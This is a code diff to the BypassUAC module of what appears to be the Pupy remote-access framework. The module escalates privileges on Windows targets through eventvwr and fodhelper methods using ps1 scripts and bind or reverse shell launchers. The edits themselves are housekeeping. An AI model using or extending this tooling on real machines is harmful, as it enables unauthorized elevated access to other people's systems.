@@ -4,7 +4,7 @@
 
 import os
 
-from pupylib.PupyModule import *
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from rpyc.utils.classic import upload
 
 import pupygen
@@ -18,8 +18,8 @@ class BypassUAC(PupyModule):
 
     """
     Try to bypass UAC
-    
-    By default, each bypass UAC method uses a ps1 script which is executed on the target. 
+
+    By default, each bypass UAC method uses a ps1 script which is executed on the target.
     By default and automatically:
       - eventvwr is used on Windows 7, 8 and some Win10 build (>= 7600)
       - fodhelper is used on Win10 build >= 10240
@@ -47,7 +47,7 @@ class BypassUAC(PupyModule):
         #Contains ip:port used for bind connection on the target with ps1 script. None if reverse connection and (consequently) isBindLauncherForPs1==False
         listeningAddressPortForBindPs1 = None
         #Usefull information for bind mode connection (ps1 script)
-        launcherType, launcherArgs, addressPort = self.client.desc['launcher'], self.client.desc['launcher_args'], self.client.desc['address']
+        launcherType, addressPort = self.client.desc['launcher'], self.client.desc['address']
         #Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
         if launcherType == "bind":
             self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))
@@ -106,7 +106,7 @@ class BypassUAC(PupyModule):
                     try:
                         listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                     except Exception as e:
-                        self.warning("You have to give me a valid port. Try again")
+                        self.warning("You have to give me a valid port. Try again ({})".format(e))
                 listeningAddress = addressPort.split(':')[0]
                 listeningAddressPortForBindPs1 = "{0}:{1}".format(listeningAddress, listeningPort)
                 self.info("The ps1 script used for bypassing UAC will be configured for listening on {0} on the target".format(listeningAddressPortForBindPs1))
